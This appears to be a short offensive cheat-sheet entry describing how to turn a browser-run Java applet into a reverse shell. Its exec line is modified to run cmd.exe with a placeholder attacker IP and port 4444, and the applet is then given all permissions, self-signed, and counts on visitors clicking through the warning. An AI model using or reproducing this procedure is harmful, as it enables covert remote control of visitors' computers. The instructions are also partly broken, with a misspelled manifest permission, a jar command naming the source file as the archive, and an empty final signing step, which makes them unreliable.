#Java Applet run from browser
Will give warning message but users may just click yes

1. Modify the `Java.java` applet as required, in this case I change `f = Runtime.getRuntime().exec("cmd.exe /c " + expath);` to `f = Runtime.getRuntime().exec("cmd.exe /c " + expath + "YO.UR.IP.ADR 4444 -e cmd.exe");`

2. Create a manifest file using `echo "Permissions: all-permisions" > /root/manifest.txt`

3. Compile the code using `javac Java.java` then `jar cvfm Java.java /root/manifest.txt Java.class`

4. Then generate a key `keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123` answering the questions as you see fit

5. And sign the applet ``
